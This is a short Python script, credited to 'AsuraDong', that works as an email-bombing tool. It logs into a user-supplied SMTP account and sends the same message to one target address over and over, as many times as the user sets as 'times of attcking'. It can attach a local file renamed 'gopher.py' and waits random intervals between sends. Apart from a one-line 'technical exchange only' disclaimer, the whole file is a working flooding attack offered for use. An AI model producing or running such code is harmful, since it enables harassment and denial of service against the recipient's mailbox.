from email.header import Header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import time
import random
import sys
'''
仅作为技术交流.
'''
__author__='AsuraDong'
__date__=='2017/3/21 13:35'

time_sleep = [0.2,5,1,6,2.3,6.1]
print('Please ensure you have openned your own smtp and set your password in your email')

msg = MIMEMultipart()

username = input('>>>input your username:\n').strip()
from_email = input('>>>input your email:\n').strip()
password = input('>>>input your smtp\'s password,not email\'s pwd:\n').strip()
to_email = input(">>>input other's email:\n").strip()
my_subject = input('>>>input your subject of this email:\n')

msg['Subject'] = Header(my_subject,'utf-8')
msg['From'] = username+('<%s>'%from_email)
msg['To'] = to_email

smtp_sever = input('>>>input your smtp server ::for example ::smtp.163.com\n').strip()
port = int(input('>>>input the port of this server ::for example :: 25\n').strip())

moudle_2 = input('>>>if input the message?(Y/N)\n').lower()
if moudle_2=='y':
	message = input('>>>input your message:\n')
	att2 = MIMEText(message,'plain','utf-8')
	msg.attach(att2)

moudle_1 = input('>>>if add the bash file?(Y/N)\n').lower()
if moudle_1=='y':
	try:
		f = open(r'test.py','rb')
	except:
		print('请切换工作目录')
		exit(1)
	att1 = MIMEText(f.read(),'base64','utf-8')
	att1["Content-Type"] = 'application/x-www-form-urlencoded'
	att1["Content-Disposition"] = 'attachment;filename="gopher.py"'#enter file's name
	msg.attach(att1)

server = smtplib.SMTP(smtp_sever,port)

attck_time = int(input('>>>input your times of attcking:\n').strip())
debug_level = int(input('>>>please ensure the debug level:\n'))
if debug_level:
	server.set_debuglevel(debug_level)

now_time = flag = 1
while now_time<=attck_time:
	try:
		server.login(from_email,password)
	except:
		print('login failed!!!Times is :',now_time+1);flag=0
	else:
		print('login succed!!!')
	try:
		server.sendmail(from_email,to_email,msg.as_string())
	except:
		print('send failed!!!');flag=0
	else:
		print('send succed!!!')
	print('FINISHED NO.',now_time+1)
	time.sleep(random.choice(time_sleep))
	now_time += 1
server.quit()
if moudle_1=='y':
	f.close()

